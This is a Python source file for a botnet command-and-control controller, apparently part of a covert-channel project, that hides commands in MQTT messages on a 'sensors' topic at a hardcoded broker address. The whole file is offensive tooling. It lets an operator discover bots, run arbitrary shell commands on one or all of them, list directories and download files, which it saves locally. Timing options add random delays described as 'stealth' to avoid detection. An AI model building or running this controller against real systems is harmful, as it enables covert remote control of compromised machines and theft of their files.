#!/usr/bin/env python3
"""MQTT C&C Controller - Covert Protocol"""

import argparse
import sys
import threading
import time
import random
import os
import base64
import paho.mqtt.client as mqtt
from paho.mqtt.enums import CallbackAPIVersion
from datetime import datetime
from covert_protocol import (
    create_time_signal, create_params_message, parse_response_message,
    cleanup_fragments, CMD_ENCODE
)

BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
RECEIVED_DIR = "received_files"


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'


class Controller:
    def __init__(self, timing=3):
        self.client = None
        self.running = False
        self.bots = {}
        self.lock = threading.Lock()
        self.pending_cmd = None
        self.timing = timing

    def _get_delay(self):
        delays = {5: (0, 0.1), 4: (0.2, 0.8), 3: (1.0, 3.0), 2: (3.0, 8.0)}
        if self.timing >= 5:
            return random.uniform(0, 0.1)
        elif self.timing in delays:
            lo, hi = delays[self.timing]
            return random.uniform(lo, hi)
        else:
            return random.uniform(5.0, 20.0) * random.uniform(0.5, 1.5)

    def connect(self, broker, port, topic):
        self.broker = broker
        self.port = port
        self.topic = topic

        self.client = mqtt.Client(
            callback_api_version=CallbackAPIVersion.VERSION2,
            client_id=f"ctrl_{random.randint(1000, 9999)}"
        )
        self.client.on_connect = self._on_connect
        self.client.on_message = self._on_message
        self.client.on_disconnect = self._on_disconnect

        try:
            self.client.connect(broker, port, keepalive=60)
            self.running = True
            self.client.loop_start()
            time.sleep(0.5)
            self._shell()
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"{Colors.RED}Connection error: {e}{Colors.RESET}")
            sys.exit(1)
        finally:
            self.running = False
            self.client.loop_stop()
            self.client.disconnect()

    def _on_connect(self, client, userdata, flags, rc, properties=None):
        if rc.is_failure if hasattr(rc, 'is_failure') else rc != 0:
            print(f"{Colors.RED}Connection failed{Colors.RESET}")
            return
        client.subscribe(self.topic)

    def _on_disconnect(self, client, userdata, disconnect_flags, rc, properties=None):
        if self.running:
            time.sleep(2)
            try:
                client.reconnect()
            except:
                pass

    def _on_message(self, client, userdata, msg):
        try:
            payload = msg.payload.decode('utf-8')
        except:
            return

        if payload.startswith("Time:"):
            return

        cleanup_fragments()

        if self.pending_cmd:
            parsed = parse_response_message(payload, self.pending_cmd)
            if parsed and parsed.get("complete"):
                self._handle_response(parsed)

    def _handle_response(self, msg):
        c = Colors
        bot_id = msg.get("bot_id", "?")
        success = msg.get("success", True)
        result = msg.get("result", {})

        with self.lock:
            self.bots[bot_id] = {"seen": datetime.now()}

        status = f"{c.GREEN}OK{c.RESET}" if success else f"{c.RED}FAIL{c.RESET}"
        print(f"\n{c.CYAN}[<<]{c.RESET} from {c.WHITE}{bot_id}{c.RESET} [{status}]")

        if isinstance(result, dict) and "data" in result:
            self._save_file(result, bot_id)
        else:
            self._print_result(result)

        print(f"{c.GRAY}>{c.RESET} ", end="", flush=True)

    def _print_result(self, result):
        c = Colors
        if not isinstance(result, dict):
            if result:
                print(f"     {result}")
            return

        for key, value in result.items():
            if key in ("data", "size"):
                continue
            elif key == "output":
                for line in str(value).strip().split('\n'):
                    print(f"     {line}")
            elif key == "error":
                print(f"     {c.RED}{value}{c.RESET}")
            elif key == "status":
                print(f"     {c.GREEN}{value}{c.RESET}")
            else:
                print(f"     {key}: {value}")

    def _save_file(self, result, bot_id):
        c = Colors
        try:
            filename = result.get("filename", "unknown")
            data = base64.b64decode(result.get("data", ""))

            os.makedirs(RECEIVED_DIR, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_path = os.path.join(RECEIVED_DIR, f"{timestamp}_{bot_id}_{filename}")

            with open(save_path, 'wb') as f:
                f.write(data)

            print(f"     {c.GREEN}Saved: {save_path} ({len(data)} bytes){c.RESET}")
        except Exception as e:
            print(f"     {c.RED}Save error: {e}{c.RESET}")

    def _send_command(self, cmd, target, params=None):
        c = Colors

        time_msg = create_time_signal(cmd)
        self.client.publish(self.topic, time_msg)
        print(f"{c.BLUE}[>>]{c.RESET} {c.MAGENTA}Time signal{c.RESET}: {time_msg}")

        delay = self._get_delay()
        if delay > 0.1:
            print(f"{c.GRAY}    waiting {delay:.1f}s...{c.RESET}")
            time.sleep(delay)

        params_msg = create_params_message(cmd, target, params)
        self.client.publish(self.topic, params_msg)
        print(f"{c.BLUE}[>>]{c.RESET} {c.YELLOW}{cmd}{c.RESET} -> {target} ({len(params_msg)} chars)")

        self.pending_cmd = cmd

    def _shell(self):
        c = Colors
        self._print_banner()

        while self.running:
            try:
                line = input(f"{c.GRAY}>{c.RESET} ").strip()
                if not line:
                    continue

                parts = line.split()
                cmd = parts[0].lower()
                args = parts[1:]

                self._process_command(cmd, args)

            except KeyboardInterrupt:
                print(f"\n{c.GRAY}Use 'exit' to quit{c.RESET}")
            except EOFError:
                self.running = False
                break
            except Exception as e:
                print(f"{c.RED}Error: {e}{c.RESET}")

    def _process_command(self, cmd, args):
        c = Colors

        if cmd in ("exit", "quit", "q"):
            print(f"{c.YELLOW}Bye.{c.RESET}")
            self.running = False
        elif cmd in ("help", "?"):
            self._print_help()
        elif cmd in ("clear", "cls"):
            print("\033[2J\033[H", end="")
            self._print_banner()
        elif cmd == "bots":
            self._list_bots()
        elif cmd == "ping":
            self._send_command("ping", args[0] if args else "*")
        elif cmd == "discover":
            self._send_command("discover", "*")
        elif cmd == "who":
            self._send_command("who", args[0] if args else "*")
        elif cmd == "user":
            self._send_command("user", args[0] if args else "*")
        elif cmd == "ls":
            if len(args) < 2:
                print(f"{c.GRAY}Usage: ls <bot|*> <path>{c.RESET}")
            else:
                self._send_command("ls", args[0], {"path": args[1]})
        elif cmd == "list":
            if len(args) < 2:
                print(f"{c.GRAY}Usage: list <bot|*> <path>{c.RESET}")
            else:
                self._send_command("list", args[0], {"path": args[1]})
        elif cmd == "copy":
            if len(args) < 2:
                print(f"{c.GRAY}Usage: copy <bot> <path>{c.RESET}")
            else:
                self._send_command("copy", args[0], {"path": args[1]})
        elif cmd == "exec":
            if len(args) < 2:
                print(f"{c.GRAY}Usage: exec <bot|*> <command>{c.RESET}")
            else:
                self._send_command("exec", args[0], {"cmd": " ".join(args[1:])})
        else:
            print(f"{c.GRAY}Unknown command: {cmd}{c.RESET}")

    def _print_banner(self):
        c = Colors
        width = 40
        broker_str = f"{self.broker}:{self.port}"
        timing_names = {5: 'instant', 4: 'fast', 3: 'normal', 2: 'slow', 1: 'stealth'}
        timing_str = f"T{self.timing} ({timing_names.get(self.timing, 'stealth')})"

        print()
        print(f"{c.CYAN}+{'-' * width}+")
        print(f"|{c.WHITE}{'MQTT C&C Controller':^{width}}{c.CYAN}|")
        print(f"+{'-' * width}+")
        print(f"| broker: {broker_str:<{width - 9}}|")
        print(f"| topic:  {self.topic:<{width - 9}}|")
        print(f"| timing: {timing_str:<{width - 9}}|")
        print(f"+{'-' * width}+{c.RESET}")
        print()
        print(f"{c.GREEN}Connected.{c.RESET} Type {c.WHITE}help{c.RESET} for commands.\n")

    def _print_help(self):
        c = Colors
        print(f"""
{c.CYAN}Commands:{c.RESET}
  {c.GREEN}discover{c.RESET}            {c.DIM}Find bots{c.RESET}     {c.GREEN}bots{c.RESET}              {c.DIM}Known bots{c.RESET}
  {c.GREEN}ping{c.RESET} {c.YELLOW}[bot|*]{c.RESET}        {c.DIM}Ping{c.RESET}          {c.GREEN}who{c.RESET} {c.YELLOW}[bot|*]{c.RESET}       {c.DIM}Logged users{c.RESET}
  {c.GREEN}user{c.RESET} {c.YELLOW}[bot|*]{c.RESET}        {c.DIM}User info{c.RESET}     {c.GREEN}exec{c.RESET} {c.YELLOW}<bot> <cmd>{c.RESET}  {c.DIM}Run command{c.RESET}
  {c.GREEN}ls{c.RESET} {c.YELLOW}<bot> <path>{c.RESET}     {c.DIM}List files{c.RESET}    {c.GREEN}list{c.RESET} {c.YELLOW}<bot> <path>{c.RESET} {c.DIM}Files+count{c.RESET}
  {c.GREEN}copy{c.RESET} {c.YELLOW}<bot> <path>{c.RESET}   {c.DIM}Download{c.RESET}      {c.GREEN}clear{c.RESET}/{c.GREEN}exit{c.RESET}        {c.DIM}Quit{c.RESET}

{c.CYAN}Response:{c.RESET} {c.MAGENTA}s{c.RESET}=status {c.MAGENTA}o{c.RESET}=output {c.MAGENTA}d{c.RESET}=discover {c.MAGENTA}n{c.RESET}=count {c.MAGENTA}e{c.RESET}=error
""")

    def _list_bots(self):
        c = Colors
        with self.lock:
            if not self.bots:
                print(f"{c.GRAY}No bots known. Run 'discover'{c.RESET}")
                return

            print(f"\n{c.CYAN}Known bots:{c.RESET}")
            for name, info in self.bots.items():
                age = datetime.now() - info['seen']
                ago = f"{age.seconds}s ago" if age.seconds < 60 else f"{age.seconds // 60}m ago"
                print(f"  {c.WHITE}{name}{c.RESET} - {ago}")
            print()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--broker", "-b", type=str, default=BROKER)
    parser.add_argument("--port", "-p", type=int, default=PORT)
    parser.add_argument("--topic", "-t", type=str, default=TOPIC)
    parser.add_argument("-T", type=int, default=3, choices=[1, 2, 3, 4, 5],
                        help="Timing: 1=stealth, 3=normal, 5=instant")
    args = parser.parse_args()

    ctrl = Controller(timing=args.T)
    ctrl.connect(args.broker, args.port, args.topic)


if __name__ == "__main__":
    main()
